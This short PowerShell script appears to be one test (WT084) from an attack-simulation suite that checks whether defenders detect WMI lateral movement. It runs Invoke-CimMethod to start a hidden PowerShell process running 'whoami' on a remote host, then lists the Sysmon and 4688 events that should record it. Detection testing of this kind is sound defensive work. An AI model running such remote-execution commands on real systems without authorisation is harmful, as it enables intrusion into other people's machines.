# CADRE — WT084 — WMI Lateral Movement
. ..\windows\lib\cadre-env.ps1
. ..\windows\lib\common.ps1
print_banner "WT084 - WMI Lateral Movement"
start_attack "084" "WMI Lateral Movement"
step "Remote process creation via Invoke-CimMethod"
run_cmd "Invoke-CimMethod -ComputerName mbr01 -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'powershell.exe -WindowStyle Hidden -Command whoami'}"
result 0 "WT084 — check Sysmon EID 1 (wmiprvse.exe child), 4688"
